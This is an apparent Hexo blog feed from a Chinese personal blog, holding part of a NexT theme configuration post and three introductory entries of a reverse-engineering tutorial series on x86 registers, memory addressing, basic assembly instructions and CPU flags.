class="line">post_wordcount:</span><br><span class="line">  item_text: true</span><br><span class="line">  wordcount: true         # 单篇 字数统计</span><br><span class="line">  min2read: true          # 单篇 阅读时长</span><br><span class="line">  totalcount: false       # 网站 字数统计</span><br><span class="line">  separated_meta: true</span><br></pre></td></tr></table></figure></div><blockquote><p>HEXO-addlink</p></blockquote><p>hexo-addlink是一个有用的工具，用于在hexo post页面中添加当前的帖子链接。</p><p>安装<br><code>$ npm install hexo-addlink --save</code></p><p>用法<br>从hexo配置中的_config.yml添加</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addlink：</span><br><span class="line">   before_text: hello</span><br><span class="line">  after_text: bye</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;对NexT主题风格的修改&quot;&gt;&lt;a href=&quot;#对NexT主题风格的修改&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="NexT" scheme="https://kabeor.github.io/categories/NexT/"/>
    
    
    <category term="blog搭建" scheme="https://kabeor.github.io/tags/blog%E6%90%AD%E5%BB%BA/"/>
    
    <category term="NexT" scheme="https://kabeor.github.io/tags/NexT/"/>
    
    <category term="主题" scheme="https://kabeor.github.io/tags/%E4%B8%BB%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>漏洞银行逆向教程1</title>
    <link href="https://kabeor.github.io/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B1/"/>
    <id>https://kabeor.github.io/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B1/</id>
    <published>2018-02-03T16:00:00.000Z</published>
    <updated>2020-03-16T04:33:07.699Z</updated>
    
    <content type="html"><![CDATA[<h2 id="计算机组成部分："><a href="#计算机组成部分：" class="headerlink" title="计算机组成部分："></a>计算机组成部分：</h2><p>1.控制器</p><p>2.运算器</p><p>3.存储器</p><p>4.输入设备</p><p>5.输出设备</p><p>CPU内部架构：控制单元，存储单元，运算单元。</p><p>总线：数据总线，地址总线，控制总线</p><p><strong>数据总线</strong></p><p>（1） 是CPU与内存或其他器件之间的数据传送的通道。</p><p>（2）数据总线的宽度决定了CPU和外界的数据传送速度。</p><p>（3）每条传输线一次只能传输1位二进制数据。</p><p>（4）数据总线是数据线数量之和。</p><p><strong>地址总线</strong></p><p>（1）CPU是通过地址总线来指定存储单元的。</p><p>（2）地址总线决定了cpu所能访问的最大内存空间的大小。<br>10根地址线能访问的最大的内存为1024位二进制数据</p><p>（3）地址总线是地址线数量之和。</p><p><strong>控制总线</strong></p><p>（1）CPU通过控制总线对外部器件进行控制。</p><p>（2）控制总线的宽度决定了CPU对外部器件的控制能力。</p><p>（3）控制总线是控制线数量之和。</p><p>一个16位宽度的地址总线的16次方 = 65536 = 64KB的内存地址</p><p>一个32位地址总线可以寻址到4,294,967,296 = 4GiB的地址。</p><p>物理地址=段地址*16+偏移地址</p><p>段地址：8086CPU将1MB的存储器空间分成许多逻辑段，每个段最大限制为64KB， 段地址就是逻辑段在主存中的起始位置。为了能用16位寄存器表示段地址，8086规定段地址必须是模16地址，即为xxxx0H形式，省略低4位0，段地址就可以用16位数据表示，它通常被保存在16位的段 寄存器中。</p><p>偏移地址：存单元距离段起始位置的偏移量简称偏移地址，由于限定每段 不超过64KB，所以偏移地址也可以用16位数据表示。  </p><p>物理地 址：在1M字节的存储器里，每一个存储单元都有一个唯一的20位地址，称为该存储单元的物理地址，把段地址左移4位再加上偏移地址就形成物理地址。</p><p>内存地址空间：多个程序共用内存地址空间</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;计算机组成部分：&quot;&gt;&lt;a href=&quot;#计算机组成部分：&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="汇编" scheme="https://kabeor.github.io/categories/%E6%B1%87%E7%BC%96/"/>
    
    <category term="漏洞银行逆向教程" scheme="https://kabeor.github.io/categories/%E6%B1%87%E7%BC%96/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="漏洞银行" scheme="https://kabeor.github.io/tags/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>漏洞银行逆向教程2</title>
    <link href="https://kabeor.github.io/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B2/"/>
    <id>https://kabeor.github.io/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B2/</id>
    <published>2018-02-03T16:00:00.000Z</published>
    <updated>2020-03-16T04:33:19.652Z</updated>
    
    <content type="html"><![CDATA[<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p>数据寄存器 AX CX DX BX</p><p>AX=ABCDH 高八位AH–ABH 低八位 AL–CDH</p><p><a href="https://i.loli.net/2018/07/14/5b49d3eeb0f28.jpg" data-fancybox="group" data-caption="f3eb806a907bf19e8782df6b3d56ff50.png" class="fancybox"><img alt="f3eb806a907bf19e8782df6b3d56ff50.png" title="f3eb806a907bf19e8782df6b3d56ff50.png" data-src="https://i.loli.net/2018/07/14/5b49d3eeb0f28.jpg" class="lazyload"></a></p><h2 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h2><ol><li><p><strong>nop</strong> 空指令</p></li><li><p><strong>mov</strong><br>MOV指令是数据传送指令，用于将一个数据从源地址传送到目标地址，其特点是不破坏源地址单元的内容。</p></li><li><p><strong>add</strong> 加 格式 ADD OPRD1,OPRD2 结果储存在OPRD1中</p></li><li><p><strong>sub</strong> 减 同上</p></li></ol><p>ps：低位加减不影响高位 后缀h或H表示16进制 16进制从00-FF 00-1=FF FF+1=00</p><p>物理地址=段地址*10H+偏移地址 段地址CS 偏移地址IP</p><p>8086为16位CPU，地址总线20位，最大FFFFF</p><h3 id="DS"><a href="#DS" class="headerlink" title="DS"></a><strong>DS</strong></h3><p>mov ax,[bx] 将bx地址中的数赋给ax</p><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a><strong>栈</strong></h3><p>push</p><p>push ax 把ax放入栈中</p><p>ESP指向当前栈点</p><p>pop</p><p>pop ax 把ax出栈</p><p>SS堆栈段 SP堆栈指针</p><p>内存寻址方式</p><p>mov ax，[bx]</p><p>ax=[ds*10H+bx]</p><h3 id="loop"><a href="#loop" class="headerlink" title="loop"></a><strong>loop</strong></h3><p>循环指令，循环次数由计数寄存器CX指定。是否执行循环体的判断指令在循环体之后，所以，至少执行1次循环体，即至少循环1次。执行LOOP指令时，CPU自动将CX的值减1，若CX=0，则结束循环；否则，重复执行循环体。</p><p>loop指令等价于C的do…while结构：<br>cx = 循环次数;</p><p>do {<br>// 循环体<br>cx–;<br>} while (cx);</p><p>结构:</p><p>1 start: mov ax, 2</p><p>2 mov cx, 11</p><p>3 s: add ax, ax</p><p>4 loop s</p><p>and ， or 指令</p><p>and 与 &amp;</p><p>or 或 |</p><p>xor 异或 ^</p><p>not 非 ~</p><p>###内存寻址方式</p><p><a href="https://i.loli.net/2018/07/14/5b49d3eec66e5.jpg" data-fancybox="group" data-caption="850e752f91de1fdcd283f6bf58115ea1.png" class="fancybox"><img alt="850e752f91de1fdcd283f6bf58115ea1.png" title="850e752f91de1fdcd283f6bf58115ea1.png" data-src="https://i.loli.net/2018/07/14/5b49d3eec66e5.jpg" class="lazyload"></a></p><p>BP：基数指针寄存器 和堆栈指针SP联合使用，作为SP的校准</p><p><a href="https://i.loli.net/2018/07/14/5b49d3eeea958.jpg" data-fancybox="group" data-caption="8baf906315fa0c7f8b5a99fbe5284d2b.png" class="fancybox"><img alt="8baf906315fa0c7f8b5a99fbe5284d2b.png" title="8baf906315fa0c7f8b5a99fbe5284d2b.png" data-src="https://i.loli.net/2018/07/14/5b49d3eeea958.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d3ef0d095.jpg" data-fancybox="group" data-caption="ba739276ca6e2949fea10b63a20af7e7.png" class="fancybox"><img alt="ba739276ca6e2949fea10b63a20af7e7.png" title="ba739276ca6e2949fea10b63a20af7e7.png" data-src="https://i.loli.net/2018/07/14/5b49d3ef0d095.jpg" class="lazyload"></a></p><p>(1)在8086CPU中只有这四个寄存器可以在[…]中进行内存单元的寻址。</p><p>比如，下面的指令都是正确的：</p><p>mov ax,[bx]</p><p>mov ax,[bx+si]</p><p>mov ax,[bx+di]</p><p>mov ax,[bp]</p><p>mov ax,[bp+si]</p><p>mov ax,[bp+di]</p><p>而下面都是错误的:</p><p>mov ax,[cx]</p><p>mov ax,[ax]</p><p>mov ax,[dx]</p><p>mov ax,[ds]</p><p>(2).在[…]中，这四个寄存器可以单独出现，或者只能以四种组合出现：bx和si、bx和di、bp和si、bp和di。</p><p>比如下面都是正确的</p><p>mov ax,[bx]</p><p>mov ax,[si]</p><p>mov ax,[di]</p><p>mov ax,[bp]</p><p>mov ax,[bx+si]</p><p>mov ax,[bx+di]</p><p>mov ax,[bp+si]</p><p>mpv ax,[bp+di]</p><p>mov ax,[bx+si+idata]</p><p>mov ax,[bx+si+idata]</p><p>mov ax,[bp+si+idata]</p><p>mov ax,[bp+di+idata]</p><p>下面就是错误的</p><p>mov ax,[bx+bp]</p><p>mov ax,[si+di]</p><p>(3)只要在[….]中使用寄存器bp，而指令汇总没有显示给出段地址，段地址就默认在ss中。<br>比如下面的指令。</p><p>mov ax,[bp] 含义：(ax)=((ss)*16+(bp))</p><p>mov ax,[bp+idata] 含义：(ax)=((ss)*16+(bp)+idata)</p><p>mov ax,[bp+si] 含义：(ax)=((ss)*16+(bp)+(si))</p><p>mov ax,[bp+si+idata] 含义：(ax)=((ss)*16+(bp)+(si)+idata)</p><h3 id="跳转指令和指令跳转原理"><a href="#跳转指令和指令跳转原理" class="headerlink" title="跳转指令和指令跳转原理"></a>跳转指令和指令跳转原理</h3><h4 id="jmp指令"><a href="#jmp指令" class="headerlink" title="jmp指令"></a>jmp指令</h4><p>jmp 地址 跳转到地址</p><h4 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h4><p><a href="https://i.loli.net/2018/07/14/5b49d3ef207d0.jpg" data-fancybox="group" data-caption="189286a35d1d75d2032a3bcab7565f1f.png" class="fancybox"><img alt="189286a35d1d75d2032a3bcab7565f1f.png" title="189286a35d1d75d2032a3bcab7565f1f.png" data-src="https://i.loli.net/2018/07/14/5b49d3ef207d0.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/14/5b49d3ef32c5f.jpg" data-fancybox="group" data-caption="934f922798e43615a5845cb60bd1c429.png" class="fancybox"><img alt="934f922798e43615a5845cb60bd1c429.png" title="934f922798e43615a5845cb60bd1c429.png" data-src="https://i.loli.net/2018/07/14/5b49d3ef32c5f.jpg" class="lazyload"></a></p><h4 id="ret指令"><a href="#ret指令" class="headerlink" title="ret指令"></a>ret指令</h4><p><a href="https://i.loli.net/2018/07/14/5b49d3ef45b0a.jpg" data-fancybox="group" data-caption="856636e8d24c26ec2f2906a0aa148469.png" class="fancybox"><img alt="856636e8d24c26ec2f2906a0aa148469.png" title="856636e8d24c26ec2f2906a0aa148469.png" data-src="https://i.loli.net/2018/07/14/5b49d3ef45b0a.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/14/5b49d3ef59d43.jpg" data-fancybox="group" data-caption="42a41be0aaef0da7b5f35032bd716e89.png" class="fancybox"><img alt="42a41be0aaef0da7b5f35032bd716e89.png" title="42a41be0aaef0da7b5f35032bd716e89.png" data-src="https://i.loli.net/2018/07/14/5b49d3ef59d43.jpg" class="lazyload"></a></p><h4 id="mul指令"><a href="#mul指令" class="headerlink" title="mul指令"></a>mul指令</h4><p><a href="https://i.loli.net/2018/07/14/5b49d3ef6e412.jpg" data-fancybox="group" data-caption="9c4ff2fbb0e0f7afd4f5c4f9b812e4a0.png" class="fancybox"><img alt="9c4ff2fbb0e0f7afd4f5c4f9b812e4a0.png" title="9c4ff2fbb0e0f7afd4f5c4f9b812e4a0.png" data-src="https://i.loli.net/2018/07/14/5b49d3ef6e412.jpg" class="lazyload"></a></p><h4 id="MUL-AB"><a href="#MUL-AB" class="headerlink" title="MUL AB"></a><strong>MUL AB</strong></h4><p>乘法指令的功能是将A和B中两个无符号8位二进制数相乘，所得的16位积的低8位存于A中，高8位存于B中。如果乘积大于256，即高位B不为0，则OV置1；否则OV清0，CY总是清0。</p><p>例如：设（A）=50H（80），（B）=0A0H（160）</p><p>若执行<strong>MUL AB</strong>，</p><p>则执行结果为：</p><p>乘积为3200H（12800），</p><p>（A）=00H，（B）=32H，（OV）=1,(CY)=0</p><p>####div指令</p><p><a href="https://i.loli.net/2018/07/14/5b49d3ef82638.jpg" data-fancybox="group" data-caption="82a0d1e420eadc3d81e899aba071f948.png" class="fancybox"><img alt="82a0d1e420eadc3d81e899aba071f948.png" title="82a0d1e420eadc3d81e899aba071f948.png" data-src="https://i.loli.net/2018/07/14/5b49d3ef82638.jpg" class="lazyload"></a></p><p>A / B  A是被除数，B是除数</p><p>除数B有 8位和16位两种，保存在一个reg寄存器里 或是内存单元中。</p><p>被除数A 默认存放在AX中（16位以内） 或<br>AX和DX中（32位，DX存放高16位，AX存放低16位）</p><p>结果： 如果除数B是8位，那么除法的结果AL保存商，AH保存余数，</p><pre><code>如果除数B是16位，那么除法的结果 AX保存商，DX保存余数。</code></pre><p>公式如下：</p><pre><code>1：  div byte ptr ds:[0]  含义：（al）= (ax)/((ds)\*16+0) 的商         (ah) = (ax/(ds)\*16+0) 的余数2：div word ptr es:[0]   含义：(ax) = [(dx)\*10000H+(ax)] / ((es)\*16+0)的商           (dx) = [(dx)\*10000H+(ax)] / ((es)\*16+0)的余数3：div byte ptr [bx+si+8]   含义：(al) = (ax) / ((ds)\*16+(bx)+(si)+8) 的商          (ah) = (ax) / ((ds)\*16+(bx)+(si)+8) 的余数4：div word ptr [bx+si+8]   含义：(ax) = [(dx)\*10000h+(ax)] / ((ds)\*16+(bx)+(si)+8) 的商         (dx) = [(dx)\*10000h+(ax)] / ((ds)\*16+(bx)+(si)+8) 的余数</code></pre>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;通用寄存器&quot;&gt;&lt;a href=&quot;#通用寄存器&quot; class=&quot;headerlink&quot; title=&quot;通用寄存器&quot;&gt;&lt;/a&gt;通用寄存器&lt;/h2&gt;&lt;p&gt;数据寄存器 AX CX DX BX&lt;/p&gt;
&lt;p&gt;AX=ABCDH 高八位AH–ABH 低八位</summary>
        
      
    
    
    
    <category term="汇编" scheme="https://kabeor.github.io/categories/%E6%B1%87%E7%BC%96/"/>
    
    <category term="漏洞银行逆向教程" scheme="https://kabeor.github.io/categories/%E6%B1%87%E7%BC%96/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="漏洞银行" scheme="https://kabeor.github.io/tags/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>漏洞银行逆向教程3</title>
    <link href="https://kabeor.github.io/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B3/"/>
    <id>https://kabeor.github.io/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B3/</id>
    <published>2018-02-03T16:00:00.000Z</published>
    <updated>2020-03-16T04:33:25.716Z</updated>
    
    <content type="html"><![CDATA[<h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><p>是一个16位的存放条件标志、控制标志寄存器，主要用于反映处理器的状态和ALU运算结果的某些特征及控制指令的执行。</p><p><a href="https://i.loli.net/2017/12/19/5a3866bc10640.png" data-fancybox="group" data-caption="36fbbb3da673e2c9444a194c929333e0.png" class="fancybox"><img alt="36fbbb3da673e2c9444a194c929333e0.png" title="36fbbb3da673e2c9444a194c929333e0.png" data-src="https://i.loli.net/2017/12/19/5a3866bc10640.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a3866bd52813.png" data-fancybox="group" data-caption="87188f5e5b3a0af629a40af69d3cd861.png" class="fancybox"><img alt="87188f5e5b3a0af629a40af69d3cd861.png" title="87188f5e5b3a0af629a40af69d3cd861.png" data-src="https://i.loli.net/2017/12/19/5a3866bd52813.png" class="lazyload"></a></p><p><a href="https://i.loli.net/2017/12/19/5a3866bed85bb.png" data-fancybox="group" data-caption="53ad6f3b606211295cc0a5bc297e8829.png" class="fancybox"><img alt="53ad6f3b606211295cc0a5bc297e8829.png" title="53ad6f3b606211295cc0a5bc297e8829.png" data-src="https://i.loli.net/2017/12/19/5a3866bed85bb.png" class="lazyload"></a></p><p>各标志在标志寄存器中的位置</p><p>条件标志：</p><ul><li><p>进位标志：用于反映运算是否产生进位或借位。如果运算结果的最高位产生一个进位或借位，则CF置1，否则置0。运算结果的最高位包括字操作的第15位和字节操作的第7位。移位指令也会将<em>操作数</em>的最高位或最低位移入CF。</p></li><li><p>奇偶标志：用于反映运算结果低8位中“1”的个数。“1”的个数为偶数，则PF置1，否则置0。</p></li><li><p><a href="https://baike.baidu.com/item/%E8%BE%85%E5%8A%A9%E8%BF%9B%E4%BD%8D%E6%A0%87%E5%BF%97" target="_blank" rel="noopener">辅助进位标志</a>：算数操作结果的第三位（从0开始计数）如果产生了进位或者借位则将其置为1，否则置为0，常在BCD(binary-codedecimal)算术运算中被使用。</p></li><li><p>零标志：用于判断结果是否为0。运算结果0，ZF置1，否则置0。</p></li><li><p>符号标志：用于反映运算结果的符号，运算结果为负，SF置1，否则置0。因为<em>有符号数</em>采用补码的形式表示，所以SF与运算结果的最高位相同。</p></li><li><p>溢出标志：反映有符号数加减运算是否溢出。如果运算结果超过了8位或者16位有符号数的表示范围，则OF置1，否则置0。</p></li><li><p>控制标志：</p></li><li><p>跟踪标志：当TF被设置位1时，CPU进入单步模式，所谓单步模式就是CPU在每执行一步指令后都产生一个单步中断。主要用于程序的调试。8086/8088中没有专门用来置位和清零TF的命令，需要用其他办法。</p></li><li><p>中断标志：决定CPU是否响应外部可屏蔽<em>中断请求</em>。IF为1时，CPU允许响应外部的可屏蔽中断请求。</p></li><li><p>方向标志：决定串操作指令执行时有关指针寄存器调整方向。当DF为1时，串操作指令按递减方式改变有关<em>存储器</em>指针值，每次操作后使SI、DI递减。</p></li></ul><h3 id="ZF标志"><a href="#ZF标志" class="headerlink" title="ZF标志"></a>ZF标志</h3><p><a href="https://i.loli.net/2017/12/19/5a3868ef2a981.png" data-fancybox="group" data-caption="ca2d20ee5f093b6db89a1a9d45766815.png" class="fancybox"><img alt="ca2d20ee5f093b6db89a1a9d45766815.png" title="ca2d20ee5f093b6db89a1a9d45766815.png" data-src="https://i.loli.net/2017/12/19/5a3868ef2a981.png" class="lazyload"></a></p><h3 id="PF标志"><a href="#PF标志" class="headerlink" title="PF标志"></a>PF标志</h3><p><a href="https://i.loli.net/2017/12/19/5a38691768414.png" data-fancybox="group" data-caption="ffe582ef099e61015c6549937eddb20a.png" class="fancybox"><img alt="ffe582ef099e61015c6549937eddb20a.png" title="ffe582ef099e61015c6549937eddb20a.png" data-src="https://i.loli.net/2017/12/19/5a38691768414.png" class="lazyload"></a></p><h3 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h3><p><a href="https://i.loli.net/2017/12/19/5a386920eeba5.png" data-fancybox="group" data-caption="a33a3e8eaa2b3a58833971ebf3ab33cb.png" class="fancybox"><img alt="a33a3e8eaa2b3a58833971ebf3ab33cb.png" title="a33a3e8eaa2b3a58833971ebf3ab33cb.png" data-src="https://i.loli.net/2017/12/19/5a386920eeba5.png" class="lazyload"></a></p><h3 id="OF标志"><a href="#OF标志" class="headerlink" title="OF标志"></a>OF标志</h3><p><a href="https://i.loli.net/2017/12/19/5a3869308cde5.png" data-fancybox="group" data-caption="5f9609726f77437178c0354a282de0e3.png" class="fancybox"><img alt="5f9609726f77437178c0354a282de0e3.png" title="5f9609726f77437178c0354a282de0e3.png" data-src="https://i.loli.net/2017/12/19/5a3869308cde5.png" class="lazyload"></a></p><h2 id="adc"><a href="#adc" class="headerlink" title="adc"></a>adc</h2><p><a href="https://i.loli.net/2017/12/19/5a3869365dacb.png" data-fancybox="group" data-caption="ffd4acf6f6e4707500e54b6d31d8af07.png" class="fancybox"><img alt="ffd4acf6f6e4707500e54b6d31d8af07.png" title="ffd4acf6f6e4707500e54b6d31d8af07.png" data-src="https://i.loli.net/2017/12/19/5a3869365dacb.png" class="lazyload"></a></p><h2 id="sbb"><a href="#sbb" class="headerlink" title="sbb"></a>sbb</h2><p><a href="https://i.loli.net/2017/12/19/5a38693a2d2a6.png" data-fancybox="group" data-caption="47e40b9a5eea33266fe79ff92cd11266.png" class="fancybox"><img alt="47e40b9a5eea33266fe79ff92cd11266.png" title="47e40b9a5eea33266fe79ff92cd11266.png" data-src="https://i.loli.net/2017/12/19/5a38693a2d2a6.png" class="lazyload"></a></p><h2 id="cmp指令"><a href="#cmp指令" class="headerlink" title="cmp指令"></a>cmp指令</h2><p><a href="https://i.loli.net/2017/12/19/5a38693da8021.png" data-fancybox="group" data-caption="16d5aee2eac343bc9ac5e236d7897726.png" class="fancybox"><img alt="16d5aee2eac343bc9ac5e236d7897726.png" title="16d5aee2eac343bc9ac5e236d7897726.png" data-src="https://i.loli.net/2017/12/19/5a38693da8021.png" class="lazyload"></a></p><p><a href="https://i.loli.net/2017/12/19/5a386940293ff.png" data-fancybox="group" data-caption="8baf906315fa0c7f8b5a99fbe5284d2b.png" class="fancybox"><img alt="8baf906315fa0c7f8b5a99fbe5284d2b.png" title="8baf906315fa0c7f8b5a99fbe5284d2b.png" data-src="https://i.loli.net/2017/12/19/5a386940293ff.png" class="lazyload"></a></p><h2 id="TEST命令"><a href="#TEST命令" class="headerlink" title="TEST命令"></a>TEST命令</h2><p><a href="https://i.loli.net/2017/12/19/5a386ac5e71cf.png" data-fancybox="group" data-caption="9f0c42b96647eb58a5f646a3bf982a4c.png" class="fancybox"><img alt="9f0c42b96647eb58a5f646a3bf982a4c.png" title="9f0c42b96647eb58a5f646a3bf982a4c.png" data-src="https://i.loli.net/2017/12/19/5a386ac5e71cf.png" class="lazyload"></a></p><h3 id="80386寄存器组"><a href="#80386寄存器组" class="headerlink" title="80386寄存器组"></a>80386寄存器组</h3><p><a href="https://i.loli.net/2017/12/19/5a386ac807f28.png" data-fancybox="group" data-caption="5865d3eef8437cc4dba05130d5b99afe.png" class="fancybox"><img alt="5865d3eef8437cc4dba05130d5b99afe.png" title="5865d3eef8437cc4dba05130d5b99afe.png" data-src="https://i.loli.net/2017/12/19/5a386ac807f28.png" class="lazyload"></a></p><h4 id="一、通用寄存器"><a href="#一、通用寄存器" class="headerlink" title="一、通用寄存器"></a>一、通用寄存器</h4><p><a href="https://i.loli.net/2017/12/19/5a386ac99176a.png" data-fancybox="group" data-caption="a71d2298fb0a47fce0bc07ef6fbb05dd.png" class="fancybox"><img alt="a71d2298fb0a47fce0bc07ef6fbb05dd.png" title="a71d2298fb0a47fce0bc07ef6fbb05dd.png" data-src="https://i.loli.net/2017/12/19/5a386ac99176a.png" class="lazyload"></a></p><p>一组八个通用寄存器是对8086/80286通用寄存器的32位扩展，其用法与在8086/80286中相似，支持8位、16位、32位操作，进行32位操作是，寄存器名称前面冠以“E”。</p><p>这八个寄存器的名称如下：EAX（累加器）、EBX（基址）、ECX（计数）、EDX（数据）、ESP（栈指针）、EBP（基址指针）、ESI（源变址）、EDI（目的变址）。</p><h2 id="二、段寄存器"><a href="#二、段寄存器" class="headerlink" title="二、段寄存器"></a>二、段寄存器</h2><p><a href="https://i.loli.net/2017/12/19/5a386ad0f22ce.png" data-fancybox="group" data-caption="975d9b58d813381005c96a9d1df68fab.png" class="fancybox"><img alt="975d9b58d813381005c96a9d1df68fab.png" title="975d9b58d813381005c96a9d1df68fab.png" data-src="https://i.loli.net/2017/12/19/5a386ad0f22ce.png" class="lazyload"></a></p><p><a href="https://i.loli.net/2017/12/19/5a386ad4335c8.png" data-fancybox="group" data-caption="3f785fc97c3c6e46c8502f6941b4bd97.png" class="fancybox"><img alt="3f785fc97c3c6e46c8502f6941b4bd97.png" title="3f785fc97c3c6e46c8502f6941b4bd97.png" data-src="https://i.loli.net/2017/12/19/5a386ad4335c8.png" class="lazyload"></a></p><p>80386比8086/80286增加了两个段寄存器FS、GS。</p><pre><code>除CS支持代码段，SS支持堆栈段外，程序员可以利用其它的所有段寄存器支持数据段。</code></pre><p>每个段寄存器对应这一个64位高速缓存器（有些资料中说有96位，但只使用其中的64位），这在8086中是没有的（在80286中为48位）。</p><h2 id="三、指令指针寄存器和标志寄存器"><a href="#三、指令指针寄存器和标志寄存器" class="headerlink" title="三、指令指针寄存器和标志寄存器"></a>三、指令指针寄存器和标志寄存器</h2><p>指令寄存器EIP是对8086/80286指令指针寄存器的32位扩展，它包含着待执行指令的32位偏移量，该值总是相对CS所代表的段基址而言的。</p><p>标志寄存器也是对8086/80286标志寄存器的32位扩展，其定义如下（这张图截自Intel关于IA32架构的最新文档）：</p><p><a href="https://i.loli.net/2017/12/19/5a386ad663a0f.jpg" data-fancybox="group" data-caption="e6e3d0563758721df9c7334caa288eba.jpg" class="fancybox"><img alt="e6e3d0563758721df9c7334caa288eba.jpg" title="e6e3d0563758721df9c7334caa288eba.jpg" data-src="https://i.loli.net/2017/12/19/5a386ad663a0f.jpg" class="lazyload"></a></p><pre><code>其中OF、DF、IF、TF、SF、ZF、AF、PF和CF在8086中就已经存在，请参考相关资料。IOPL（I/O Privilege</code></pre><p>Level）是从80286开始出现的，占2个bit表示I/O特权级，如果当前特权级小于或等于IOPL，则可以执行I/O操作，否则将出现一个保护性异常。IOPL只能由特权级为0的程序或任务来修改。</p><pre><code>NT（Nested</code></pre><p>Task）也是从80286开始出现的，表示嵌套任务，用于控制中断返回指令IRET，当NT=0时，用堆栈中保存的值恢复EFLAGS、CS和EIP，从而实现返回；若NT=1，则通过任务切换实现中断返回。</p><pre><code>下面的标志位是80386以后的CPU才有的标志。VM（Virtual-8086</code></pre><p>mode）表示虚拟8086模式，如果VM被置位且80386已出于保护模式下，则CPU切换到虚拟8086模式，此时，对段的任何操作又回到了实模式，如同在8086下运行一样。</p><pre><code>RF（Resume</code></pre><p>flag）表示恢复标志(也叫重启标志)，与调试寄存器一起用于断点和单步操作，当RF＝1<br>时，下一条指令的任何调试故障将被忽略，不产生异常中断。当RF=0时，调试故障被接受，并产生异常中断。用于调试失败后，强迫程序恢复执行，在成功执行每条指令后，RF自动复位。</p><pre><code>AC（Alignment</code></pre><p>check）表示对齐检查。这个标志是80486以后的CPU才有的。当AC=1且CR0中的AM=1时，允许存储器进行地址对齐检查，若发现地址未对齐，将产生异常中断。所谓地址对齐，是指当访问一个字（2字节长）时，其地址必须是偶数（2的倍数），当访问双字（4字节长）时，其地址必须是4的倍数。</p><pre><code>但是只有运行在特权级3的程序才执行地址对齐检查，特权级0、1、2忽略该标志。VIF（Virtual interrupt</code></pre><p>flag）表示虚拟中断标志。以下的三个标志是Pentium以后的CPU才有的。当VIF=1时，可以使用虚拟中断，当VIF=0时不能使用虚拟中断。该标志要和下面的VIP和CR4中的VME配合使用。</p><pre><code>VIP（Virtual interrupt pending</code></pre><p>flag）表示虚拟中断挂起标志。当VIP=1时，VIF有效，VIP=0时VIF无效。</p><pre><code>ID（Identification flag）表示鉴别标志。该标志用来只是Pentium</code></pre><p>CPU是否支持CPUID的指令。</p><p><a href="https://i.loli.net/2017/12/19/5a386ad878cad.png" data-fancybox="group" data-caption="d2d51f8cf44c9073402b4fa4de1bd344.png" class="fancybox"><img alt="d2d51f8cf44c9073402b4fa4de1bd344.png" title="d2d51f8cf44c9073402b4fa4de1bd344.png" data-src="https://i.loli.net/2017/12/19/5a386ad878cad.png" class="lazyload"></a></p><p><a href="https://i.loli.net/2017/12/19/5a386ae4b7adf.png" data-fancybox="group" data-caption="fbe5b69d75e642200f06d86ac1d39c19.png" class="fancybox"><img alt="fbe5b69d75e642200f06d86ac1d39c19.png" title="fbe5b69d75e642200f06d86ac1d39c19.png" data-src="https://i.loli.net/2017/12/19/5a386ae4b7adf.png" class="lazyload"></a></p><h2 id="四、系统地址寄存器"><a href="#四、系统地址寄存器" class="headerlink" title="四、系统地址寄存器"></a>四、系统地址寄存器</h2><pre><code>80386</code></pre><p>中有4个系统表寄存器，分别是全局描述符表寄存器(GDTR)、中断描述符表寄存器(IDTR)、局部描述符表寄存器(LDTR)、任务状态寄存器(TR)。系统表寄存器用于在保护方式下，管理4<br>个系统表，由于只能在保护方式下使用，因此又称为保护方式寄存器。</p><p><a href="https://i.loli.net/2017/12/19/5a386daf9c07a.png" data-fancybox="group" data-caption="5fa78f20bd62e5c378f9b34f76273328.png" class="fancybox"><img alt="5fa78f20bd62e5c378f9b34f76273328.png" 